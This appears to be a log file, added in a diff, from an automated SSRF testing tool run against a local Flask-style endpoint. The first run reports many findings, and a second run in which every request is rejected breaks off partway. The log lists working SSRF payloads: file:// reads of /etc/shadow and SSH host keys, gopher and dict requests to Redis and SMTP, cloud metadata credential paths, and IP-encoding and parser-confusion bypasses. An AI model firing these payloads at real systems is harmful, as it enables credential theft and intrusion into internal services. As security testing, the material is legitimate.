@@ -1,0 +1,754 @@
+[2025-10-26 22:49:24] [INFO] Starting comprehensive SSRF exploitation test against: http://localhost:5000/get
+[2025-10-26 22:49:24] [INFO] Starting internal service enumeration...
+[2025-10-26 22:49:24] [INFO] Running Internal Service Enumeration - 30 test cases...
+[2025-10-26 22:49:27] [INFO] ✅ Tested: Localhost access: http://127.1/ - Status: 500
+[2025-10-26 22:49:27] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost access: http://127.0.0.1:80/
+[2025-10-26 22:49:27] [CRITICAL]     URL: http://127.0.0.1:80/
+[2025-10-26 22:49:27] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:49:27] [INFO] ✅ Tested: Localhost access: http://127.0.1/ - Status: 500
+[2025-10-26 22:49:27] [INFO] ✅ Tested: Localhost access: http://0.0.0.0/ - Status: 500
+[2025-10-26 22:49:27] [CRITICAL] 🚨 VULNERABILITY FOUND: Router admin interface
+[2025-10-26 22:49:27] [CRITICAL]     URL: http://192.168.1.1/
+[2025-10-26 22:49:27] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:49:27] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost access: http://127.0.0.1/
+[2025-10-26 22:49:27] [CRITICAL]     URL: http://127.0.0.1/
+[2025-10-26 22:49:27] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:49:29] [INFO] ✅ Tested: Localhost access: http://[::1]/ - Status: 500
+[2025-10-26 22:49:29] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost access: http://localhost/
+[2025-10-26 22:49:29] [CRITICAL]     URL: http://localhost/
+[2025-10-26 22:49:29] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:49:29] [INFO] ✅ Tested: GCP Metadata service - Status: 500
+[2025-10-26 22:49:31] [CRITICAL] 🚨 VULNERABILITY FOUND: Local port 80
+[2025-10-26 22:49:31] [CRITICAL]     URL: http://127.0.0.1:80/
+[2025-10-26 22:49:31] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:49:31] [INFO] ✅ Tested: Localhost access: http://localhost:8080/ - Status: 500
+[2025-10-26 22:49:33] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost port 80
+[2025-10-26 22:49:33] [CRITICAL]     URL: http://localhost:80/
+[2025-10-26 22:49:33] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:49:33] [INFO] ✅ Tested: Local port 443 - Status: 500
+[2025-10-26 22:49:35] [INFO] ✅ Tested: Local port 8080 - Status: 500
+[2025-10-26 22:49:37] [ERROR] ❌ Error: Internal network gateway - Timeout
+[2025-10-26 22:49:37] [INFO] ✅ Tested: Localhost port 443 - Status: 500
+[2025-10-26 22:49:37] [INFO] ✅ Tested: Local port 8000 - Status: 500
+[2025-10-26 22:49:39] [ERROR] ❌ Error: Corporate network - Timeout
+[2025-10-26 22:49:39] [ERROR] ❌ Error: Alibaba Cloud metadata - Timeout
+[2025-10-26 22:49:39] [ERROR] ❌ Error: AWS Metadata service - Timeout
+[2025-10-26 22:49:39] [ERROR] ❌ Error: Internal network - Timeout
+[2025-10-26 22:49:39] [ERROR] ❌ Error: Common router IP - Timeout
+[2025-10-26 22:49:39] [INFO] ✅ Tested: Localhost port 8080 - Status: 500
+[2025-10-26 22:49:39] [CRITICAL] 🚨 VULNERABILITY FOUND: Local port 5000
+[2025-10-26 22:49:39] [CRITICAL]     URL: http://127.0.0.1:5000/
+[2025-10-26 22:49:39] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:49:41] [INFO] ✅ Tested: Local port 3000 - Status: 500
+[2025-10-26 22:49:41] [INFO] ✅ Tested: Localhost port 8000 - Status: 500
+[2025-10-26 22:49:43] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost port 5000
+[2025-10-26 22:49:43] [CRITICAL]     URL: http://localhost:5000/
+[2025-10-26 22:49:43] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:49:43] [INFO] ✅ Tested: Local port 9000 - Status: 500
+[2025-10-26 22:49:43] [INFO] ✅ Tested: Localhost port 3000 - Status: 500
+[2025-10-26 22:49:45] [INFO] ✅ Tested: Localhost port 9000 - Status: 500
+[2025-10-26 22:49:45] [INFO] Completed Internal Service Enumeration: 8/30 vulnerabilities found
+[2025-10-26 22:49:46] [INFO] Testing cloud metadata service access...
+[2025-10-26 22:49:46] [INFO] Running Cloud Metadata Access - 15 test cases...
+[2025-10-26 22:49:48] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/ - Status: 500
+[2025-10-26 22:49:48] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/instance/ - Status: 500
+[2025-10-26 22:49:48] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/project/ - Status: 500
+[2025-10-26 22:49:58] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/ - Timeout
+[2025-10-26 22:49:58] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/public-keys/ - Timeout
+[2025-10-26 22:49:58] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/ami-id - Timeout
+[2025-10-26 22:49:58] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/user-data/ - Timeout
+[2025-10-26 22:49:58] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/dynamic/instance-identity/document - Timeout
+[2025-10-26 22:49:58] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ - Timeout
+[2025-10-26 22:49:58] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/hostname - Timeout
+[2025-10-26 22:50:00] [ERROR] ❌ Error: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/ - Timeout
+[2025-10-26 22:50:00] [ERROR] ❌ Error: Azure Metadata: http://169.254.169.254/metadata/instance - Timeout
+[2025-10-26 22:50:00] [ERROR] ❌ Error: Azure Metadata: http://169.254.169.254/metadata/attested/document - Timeout
+[2025-10-26 22:50:10] [ERROR] ❌ Error: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/id - Timeout
+[2025-10-26 22:50:10] [ERROR] ❌ Error: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/user-data - Timeout
+[2025-10-26 22:50:10] [INFO] Completed Cloud Metadata Access: 0/15 vulnerabilities found
+[2025-10-26 22:50:11] [INFO] Testing dangerous protocol attacks...
+[2025-10-26 22:50:11] [INFO] Running Protocol-Based Attacks - 27 test cases...
+[2025-10-26 22:50:13] [INFO] ✅ Tested: File protocol: file:///etc/ssh/ssh_host_rsa_key - Status: 500
+[2025-10-26 22:50:13] [INFO] ✅ Tested: File protocol: file:///etc/shadow - Status: 500
+[2025-10-26 22:50:13] [INFO] ✅ Tested: File protocol: file:///proc/self/environ - Status: 500
+[2025-10-26 22:50:13] [INFO] ✅ Tested: File protocol: file:///etc/passwd - Status: 500
+[2025-10-26 22:50:13] [CRITICAL] 🚨 VULNERABILITY FOUND: File protocol: file:///c:/windows/system32/drivers/etc/hosts
+[2025-10-26 22:50:13] [CRITICAL]     URL: file:///c:/windows/system32/drivers/etc/hosts
+[2025-10-26 22:50:13] [CRITICAL]     Evidence: File protocol access successful
+[2025-10-26 22:50:13] [INFO] ✅ Tested: File protocol: file:///etc/hosts - Status: 500
+[2025-10-26 22:50:13] [INFO] ✅ Tested: File protocol: file://../config.py - Status: 500
+[2025-10-26 22:50:13] [INFO] ✅ Tested: File protocol: file:///c:/boot.ini - Status: 500
+[2025-10-26 22:50:13] [CRITICAL] 🚨 VULNERABILITY FOUND: File protocol: file:///c:/windows/win.ini
+[2025-10-26 22:50:13] [CRITICAL]     URL: file:///c:/windows/win.ini
+[2025-10-26 22:50:13] [CRITICAL]     Evidence: File protocol access successful
+[2025-10-26 22:50:13] [CRITICAL] 🚨 VULNERABILITY FOUND: File protocol: file://test_file.txt
+[2025-10-26 22:50:13] [CRITICAL]     URL: file://test_file.txt
+[2025-10-26 22:50:13] [CRITICAL]     Evidence: File protocol access successful
+[2025-10-26 22:50:15] [INFO] ✅ Tested: File protocol: file://./app.py - Status: 500
+[2025-10-26 22:50:15] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://127.0.0.1:25/_HELO%20localhost
+[2025-10-26 22:50:15] [CRITICAL]     URL: gopher://127.0.0.1:25/_HELO%20localhost
+[2025-10-26 22:50:15] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:15] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://localhost:6379/_KEYS%20*
+[2025-10-26 22:50:15] [CRITICAL]     URL: gopher://localhost:6379/_KEYS%20*
+[2025-10-26 22:50:15] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:15] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://127.0.0.1:6379/_INFO
+[2025-10-26 22:50:15] [CRITICAL]     URL: gopher://127.0.0.1:6379/_INFO
+[2025-10-26 22:50:15] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:15] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com
+[2025-10-26 22:50:15] [CRITICAL]     URL: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com
+[2025-10-26 22:50:15] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:15] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0
+[2025-10-26 22:50:15] [CRITICAL]     URL: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0
+[2025-10-26 22:50:15] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:15] [INFO] ✅ Tested: Data URI: data:text/plain,SSRF%20Test%20Data - Status: 200
+[2025-10-26 22:50:15] [INFO] ✅ Tested: Data URI: data:text/html,<h1>SSRF%20Test</h1> - Status: 200
+[2025-10-26 22:50:15] [INFO] ✅ Tested: Data URI: data:application/x-php,<?php%20phpinfo();%20?> - Status: 200
+[2025-10-26 22:50:15] [INFO] ✅ Tested: Data URI: data:text/html,<script>alert("XSS")</script> - Status: 200
+[2025-10-26 22:50:17] [INFO] ✅ Tested: Data URI: data:text/css,body{background:red} - Status: 200
+[2025-10-26 22:50:17] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol: dict://127.0.0.1:11211/stats
+[2025-10-26 22:50:17] [CRITICAL]     URL: dict://127.0.0.1:11211/stats
+[2025-10-26 22:50:17] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:17] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol: dict://localhost:6379/info
+[2025-10-26 22:50:17] [CRITICAL]     URL: dict://localhost:6379/info
+[2025-10-26 22:50:17] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:17] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol: dict://192.168.1.1:80/
+[2025-10-26 22:50:17] [CRITICAL]     URL: dict://192.168.1.1:80/
+[2025-10-26 22:50:17] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:17] [CRITICAL] 🚨 VULNERABILITY FOUND: Phar protocol: phar:///etc/passwd
+[2025-10-26 22:50:17] [CRITICAL]     URL: phar:///etc/passwd
+[2025-10-26 22:50:17] [CRITICAL]     Evidence: Found 'etc/passwd' in response
+[2025-10-26 22:50:17] [INFO] ✅ Tested: Phar protocol: phar://test_file.txt - Status: 200
+[2025-10-26 22:50:17] [INFO] ✅ Tested: Phar protocol: phar://./app.py - Status: 200
+[2025-10-26 22:50:17] [INFO] Completed Protocol-Based Attacks: 12/27 vulnerabilities found
+[2025-10-26 22:50:18] [INFO] Testing SSRF bypass techniques...
+[2025-10-26 22:50:18] [INFO] Running Bypass Techniques - 28 test cases...
+[2025-10-26 22:50:20] [INFO] ✅ Tested: IP encoding: http://0x7f.0.0.1/ - Status: 500
+[2025-10-26 22:50:20] [INFO] ✅ Tested: IP encoding: http://0177.0.0.1/ - Status: 500
+[2025-10-26 22:50:20] [INFO] ✅ Tested: IP encoding: http://0x7f.1/ - Status: 500
+[2025-10-26 22:50:20] [INFO] ✅ Tested: IP encoding: http://0177.0000.0000.0001/ - Status: 500
+[2025-10-26 22:50:21] [CRITICAL] 🚨 VULNERABILITY FOUND: IP encoding: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 22:50:21] [CRITICAL]     URL: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 22:50:21] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:22] [INFO] ✅ Tested: IP encoding: http://0x7f000001/ - Status: 500
+[2025-10-26 22:50:22] [INFO] ✅ Tested: IP encoding: http://127.1/ - Status: 500
+[2025-10-26 22:50:22] [INFO] ✅ Tested: IP encoding: http://127.0.1/ - Status: 500
+[2025-10-26 22:50:23] [INFO] ✅ Tested: DNS trick: http://subdomain.localhost/ - Status: 500
+[2025-10-26 22:50:23] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://127.0.0.1.nip.io/
+[2025-10-26 22:50:23] [CRITICAL]     URL: http://127.0.0.1.nip.io/
+[2025-10-26 22:50:23] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:24] [INFO] ✅ Tested: DNS trick: http://localhost.localdomain/ - Status: 500
+[2025-10-26 22:50:24] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://localtest.me/
+[2025-10-26 22:50:24] [CRITICAL]     URL: http://localtest.me/
+[2025-10-26 22:50:24] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:25] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://lvh.me/
+[2025-10-26 22:50:25] [CRITICAL]     URL: http://lvh.me/
+[2025-10-26 22:50:25] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:25] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://evil.com@127.0.0.1/
+[2025-10-26 22:50:25] [CRITICAL]     URL: http://evil.com@127.0.0.1/
+[2025-10-26 22:50:25] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:26] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://127.0.0.1#@evil.com/
+[2025-10-26 22:50:26] [CRITICAL]     URL: http://127.0.0.1#@evil.com/
+[2025-10-26 22:50:26] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:26] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://127.0.0.1?@evil.com/
+[2025-10-26 22:50:26] [CRITICAL]     URL: http://127.0.0.1?@evil.com/
+[2025-10-26 22:50:26] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:27] [INFO] ✅ Tested: DNS trick: http://vcap.me/ - Status: 200
+[2025-10-26 22:50:27] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://127.0.0.1@evil.com/
+[2025-10-26 22:50:27] [CRITICAL]     URL: http://127.0.0.1@evil.com/
+[2025-10-26 22:50:27] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:27] [INFO] ✅ Tested: Parser confusion: http://[::]:80/ - Status: 500
+[2025-10-26 22:50:27] [INFO] ✅ Tested: IP encoding: http://3232235521/ - Status: 500
+[2025-10-26 22:50:27] [INFO] ✅ Tested: IP encoding: http://2130706433/ - Status: 500
+[2025-10-26 22:50:27] [INFO] ✅ Tested: IP encoding: http://16843009/ - Status: 500
+[2025-10-26 22:50:27] [INFO] ✅ Tested: IP encoding: http://0xc0a80001/ - Status: 500
+[2025-10-26 22:50:27] [INFO] ✅ Tested: Parser confusion: http://[::ffff:127.0.0.1]/ - Status: 500
+[2025-10-26 22:50:29] [CRITICAL] 🚨 VULNERABILITY FOUND: Case variation: http://127.0.0.1:80/../
+[2025-10-26 22:50:29] [CRITICAL]     URL: http://127.0.0.1:80/../
+[2025-10-26 22:50:29] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:29] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/..;/ - Status: 200
+[2025-10-26 22:50:30] [CRITICAL] 🚨 VULNERABILITY FOUND: Case variation: http://LOCALHOST/
+[2025-10-26 22:50:30] [CRITICAL]     URL: http://LOCALHOST/
+[2025-10-26 22:50:30] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:30] [CRITICAL] 🚨 VULNERABILITY FOUND: Case variation: http://LocalHost/
+[2025-10-26 22:50:30] [CRITICAL]     URL: http://LocalHost/
+[2025-10-26 22:50:30] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:30] [INFO] Completed Bypass Techniques: 11/28 vulnerabilities found
+[2025-10-26 22:50:31] [INFO] Validating security controls...
+[2025-10-26 22:50:31] [INFO] Running Security Control Validation - 16 test cases...
+[2025-10-26 22:50:33] [INFO] ✅ Tested: FTP protocol blocking - Status: 500
+[2025-10-26 22:50:33] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol blocking
+[2025-10-26 22:50:33] [CRITICAL]     URL: gopher://127.0.0.1:6379
+[2025-10-26 22:50:33] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:33] [INFO] ✅ Tested: Phar protocol blocking - Status: 200
+[2025-10-26 22:50:33] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol blocking
+[2025-10-26 22:50:33] [CRITICAL]     URL: dict://127.0.0.1:11211
+[2025-10-26 22:50:33] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 22:50:33] [INFO] ✅ Tested: File protocol blocking - Status: 500
+[2025-10-26 22:50:33] [INFO] ✅ Tested: Data URI blocking - Status: 200
+[2025-10-26 22:50:33] [INFO] ✅ Tested: Localhost blocking - Status: 200
+[2025-10-26 22:50:35] [INFO] ✅ Tested: Allowed API endpoint - Status: 200
+[2025-10-26 22:50:35] [INFO] ✅ Tested: Allowed external URL - Status: 200
+[2025-10-26 22:50:35] [CRITICAL] 🚨 VULNERABILITY FOUND: RFC 1918 blocking
+[2025-10-26 22:50:35] [CRITICAL]     URL: http://192.168.1.1/
+[2025-10-26 22:50:35] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:35] [INFO] ✅ Tested: All zeros blocking - Status: 500
+[2025-10-26 22:50:36] [INFO] ✅ Tested: Allowed HTTPS URL - Status: 200
+[2025-10-26 22:50:37] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost hostname blocking
+[2025-10-26 22:50:37] [CRITICAL]     URL: http://localhost/
+[2025-10-26 22:50:37] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 22:50:45] [ERROR] ❌ Error: Private class A blocking - Timeout
+[2025-10-26 22:50:45] [ERROR] ❌ Error: Private class B blocking - Timeout
+[2025-10-26 22:50:45] [ERROR] ❌ Error: Link-local blocking - Timeout
+[2025-10-26 22:50:45] [INFO] Completed Security Control Validation: 4/16 vulnerabilities found
+[2025-10-26 22:50:46] [INFO] Starting internal network scanning...
+[2025-10-26 22:50:48] [SUCCESS] 🌐 SERVICE FOUND: http://192.168.1.1:80/
+[2025-10-26 22:53:42] [INFO] Generating comprehensive report...
+[2025-10-26 22:53:42] [ERROR] Unexpected error: 'total_tests'
+[2025-10-26 22:59:48] [INFO] Starting comprehensive SSRF exploitation test against: http://localhost:5000/get
+[2025-10-26 22:59:48] [INFO] Starting internal service enumeration...
+[2025-10-26 22:59:48] [INFO] Running Internal Service Enumeration - 30 test cases...
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://0.0.0.0/ - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://127.0.0.1:80/ - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Internal network gateway - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://localhost/ - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://127.0.1/ - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Router admin interface - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://[::1]/ - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://localhost:8080/ - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://127.1/ - Status: 415
+[2025-10-26 22:59:50] [INFO] ✅ Tested: Localhost access: http://127.0.0.1/ - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Corporate network - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Common router IP - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Internal network - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: AWS Metadata service - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: GCP Metadata service - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Local port 80 - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Alibaba Cloud metadata - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Localhost port 80 - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Local port 443 - Status: 415
+[2025-10-26 22:59:52] [INFO] ✅ Tested: Localhost port 443 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Localhost port 8080 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Local port 8080 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Localhost port 8000 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Local port 8000 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Local port 3000 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Localhost port 3000 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Local port 5000 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Local port 9000 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Localhost port 5000 - Status: 415
+[2025-10-26 22:59:54] [INFO] ✅ Tested: Localhost port 9000 - Status: 415
+[2025-10-26 22:59:54] [INFO] Completed Internal Service Enumeration: 0/30 vulnerabilities found
+[2025-10-26 22:59:55] [INFO] Testing cloud metadata service access...
+[2025-10-26 22:59:55] [INFO] Running Cloud Metadata Access - 15 test cases...
+[2025-10-26 22:59:57] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/user-data/ - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/dynamic/instance-identity/document - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/hostname - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/ - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/public-keys/ - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/instance/ - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: AWS Metadata: http://169.254.169.254/latest/meta-data/ami-id - Status: 415
+[2025-10-26 22:59:57] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/project/ - Status: 415
+[2025-10-26 22:59:59] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/instance - Status: 415
+[2025-10-26 22:59:59] [INFO] ✅ Tested: Azure Metadata: http://169.254.169.254/metadata/attested/document - Status: 415
+[2025-10-26 22:59:59] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/ - Status: 415
+[2025-10-26 22:59:59] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/user-data - Status: 415
+[2025-10-26 22:59:59] [INFO] ✅ Tested: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/id - Status: 415
+[2025-10-26 22:59:59] [INFO] Completed Cloud Metadata Access: 0/15 vulnerabilities found
+[2025-10-26 23:00:00] [INFO] Testing dangerous protocol attacks...
+[2025-10-26 23:00:00] [INFO] Running Protocol-Based Attacks - 27 test cases...
+[2025-10-26 23:00:02] [INFO] ✅ Tested: File protocol: file:///etc/ssh/ssh_host_rsa_key - Status: 415
+[2025-10-26 23:00:02] [INFO] ✅ Tested: File protocol: file:///etc/passwd - Status: 415
+[2025-10-26 23:00:02] [INFO] ✅ Tested: File protocol: file://test_file.txt - Status: 415
+[2025-10-26 23:00:03] [INFO] ✅ Tested: File protocol: file:///c:/windows/win.ini - Status: 415
+[2025-10-26 23:00:03] [INFO] ✅ Tested: File protocol: file:///etc/hosts - Status: 415
+[2025-10-26 23:00:03] [INFO] ✅ Tested: File protocol: file:///c:/windows/system32/drivers/etc/hosts - Status: 415
+[2025-10-26 23:00:03] [INFO] ✅ Tested: File protocol: file:///etc/shadow - Status: 415
+[2025-10-26 23:00:03] [INFO] ✅ Tested: File protocol: file:///proc/self/environ - Status: 415
+[2025-10-26 23:00:03] [INFO] ✅ Tested: File protocol: file://../config.py - Status: 415
+[2025-10-26 23:00:03] [INFO] ✅ Tested: File protocol: file:///c:/boot.ini - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:6379/_KEYS%20* - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: File protocol: file://./app.py - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Gopher protocol: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:6379/_INFO - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Data URI: data:text/html,<script>alert("XSS")</script> - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Data URI: data:text/plain,SSRF%20Test%20Data - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Data URI: data:application/x-php,<?php%20phpinfo();%20?> - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Gopher protocol: gopher://127.0.0.1:25/_HELO%20localhost - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Gopher protocol: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0 - Status: 415
+[2025-10-26 23:00:05] [INFO] ✅ Tested: Data URI: data:text/html,<h1>SSRF%20Test</h1> - Status: 415
+[2025-10-26 23:00:07] [INFO] ✅ Tested: Data URI: data:text/css,body{background:red} - Status: 415
+[2025-10-26 23:00:07] [INFO] ✅ Tested: Dict protocol: dict://localhost:6379/info - Status: 415
+[2025-10-26 23:00:07] [INFO] ✅ Tested: Dict protocol: dict://192.168.1.1:80/ - Status: 415
+[2025-10-26 23:00:07] [INFO] ✅ Tested: Phar protocol: phar:///etc/passwd - Status: 415
+[2025-10-26 23:00:07] [INFO] ✅ Tested: Dict protocol: dict://127.0.0.1:11211/stats - Status: 415
+[2025-10-26 23:00:07] [INFO] ✅ Tested: Phar protocol: phar://./app.py - Status: 415
+[2025-10-26 23:00:07] [INFO] ✅ Tested: Phar protocol: phar://test_file.txt - Status: 415
+[2025-10-26 23:00:07] [INFO] Completed Protocol-Based Attacks: 0/27 vulnerabilities found
+[2025-10-26 23:00:08] [INFO] Testing SSRF bypass techniques...
+[2025-10-26 23:00:08] [INFO] Running Bypass Techniques - 28 test cases...
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://2130706433/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://3232235521/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://0177.0000.0000.0001/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://0x7f.0.0.1/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://0xc0a80001/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://0177.0.0.1/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://16843009/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://0x7f000001/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://0x7f.0x0.0x0.0x1/ - Status: 415
+[2025-10-26 23:00:10] [INFO] ✅ Tested: IP encoding: http://0x7f.1/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: IP encoding: http://127.1/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: IP encoding: http://127.0.1/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: DNS trick: http://127.0.0.1.nip.io/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: DNS trick: http://lvh.me/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: DNS trick: http://localhost.localdomain/ - Status: 415
+[2025-10-26 23:00:12] [INFO] ✅ Tested: DNS trick: http://localtest.me/ - Status: 415
